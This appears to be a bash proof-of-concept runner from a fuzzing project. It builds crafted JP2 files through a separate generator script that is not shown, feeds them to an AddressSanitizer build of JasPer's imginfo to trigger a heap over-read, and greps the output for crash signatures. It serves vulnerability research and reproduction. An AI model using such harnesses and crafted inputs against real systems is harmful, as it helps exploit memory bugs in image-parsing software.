#!/usr/bin/env bash
# VULN 002 PoC runner: mem_read heap over-read via negative cnt in JasPer
# Tries up to 3 variants of crafted JP2 files.
set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/jasper/src_libjasper_base_jas_stream_c"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
JP2_FILE="${POC_DIR}/vuln_002.jp2"
RESULT_FILE="${POC_DIR}/vuln_002_result.txt"
ASAN_LOG_PREFIX="${POC_DIR}/asan.log"
GEN_SCRIPT="${POC_DIR}/vuln_002_gen.py"

rm -f "${RESULT_FILE}" "${ASAN_LOG_PREFIX}".* 2>/dev/null || true

run_variant() {
    local variant="$1"
    echo "=== Trying variant ${variant} ===" | tee -a "${RESULT_FILE}"

    # Generate the crafted JP2 file
    python3 "${GEN_SCRIPT}" "${variant}" 2>&1 | tee -a "${RESULT_FILE}"

    echo "" >> "${RESULT_FILE}"
    echo "--- Running imginfo ---" >> "${RESULT_FILE}"

    ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan.log" \
      "${IMGINFO}" \
      -f "${JP2_FILE}" \
      >> "${RESULT_FILE}" 2>&1 || true

    echo "" >> "${RESULT_FILE}"

    # Collect ASAN/UBSAN logs
    echo "=== ASAN/UBSAN output ===" >> "${RESULT_FILE}"
    local found_log=0
    for log in "${ASAN_LOG_PREFIX}".*; do
        if [ -f "${log}" ]; then
            echo "--- ASAN log: ${log} ---" >> "${RESULT_FILE}"
            cat "${log}" >> "${RESULT_FILE}"
            found_log=1
        fi
    done
    if [ "${found_log}" -eq 0 ]; then
        echo "(no ASAN log files found)" >> "${RESULT_FILE}"
    fi
    echo "" >> "${RESULT_FILE}"

    # Check for crash indicators
    if grep -qE \
        "ERROR:|runtime error:|SEGV|heap-buffer-overflow|stack-buffer-overflow|AddressSanitizer|UndefinedBehaviorSanitizer|assertion.*failed|Assertion.*failed|SIGABRT|SIGSEGV|abort" \
        "${RESULT_FILE}" 2>/dev/null; then
        echo "[!] CRASH/ERROR detected in variant ${variant}" | tee -a "${RESULT_FILE}"
        return 0  # crash found
    fi
    return 1  # no crash
}

CRASHED=0
for v in 1 2 3; do
    # Clean up ASAN logs between variants
    rm -f "${ASAN_LOG_PREFIX}".* 2>/dev/null || true

    if run_variant "${v}"; then
        CRASHED=1
        break
    fi
done

echo "" >> "${RESULT_FILE}"
echo "=== Final summary ===" >> "${RESULT_FILE}"
if [ "${CRASHED}" -eq 1 ]; then
    echo "CRASH DETECTED" >> "${RESULT_FILE}"
else
    echo "No crash detected after all variants" >> "${RESULT_FILE}"
fi

echo "[*] Results written to ${RESULT_FILE}"
echo "[*] Done."
